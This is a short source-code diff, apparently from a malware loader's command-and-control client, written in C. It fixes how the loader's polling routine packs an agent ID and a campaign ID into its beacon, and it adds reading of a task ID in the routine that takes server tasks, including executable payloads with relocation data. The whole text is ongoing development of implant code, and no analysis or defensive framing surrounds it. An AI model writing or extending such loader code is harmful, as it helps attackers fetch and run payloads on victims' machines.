@@ -19,8 +19,8 @@ void LdrInitPoll() {
     NwLoadApis();
     ParserWrite *writer = ParserInitWrite();
     ParserWrite4(writer, POLL_CODE);
-    ParserWriteBytes(writer, ldr->config->AgentId, sizeof(ldr->config->AgentId));
-    ParserWriteBytes(writer, ldr->config->CampaignID, sizeof(ldr->config->CampaignID));
+    ParserWriteBytes(writer, ldr->config->AgentId, LdrStrlen(ldr->config->AgentId));
+    ParserWriteBytes(writer, ldr->config->CampaignID, LdrStrlen(ldr->config->CampaignID));
     sPollBody = ParserWriteReturnPointer(writer);
     sPollSize = (DWORD)ParserWriteReturnSize(writer);
 }
@@ -47,6 +47,7 @@ LdrTask LdrPollServer() {
         ldr->win32->LocalFree(Addr);
         return task;
     }
+    task.Id = ParserRead4(pr);
     task.FileType = ParserRead4(pr);
     if(task.FileType == FILE_EXE) {
     	task.hasReloc = ParserRead4(pr);
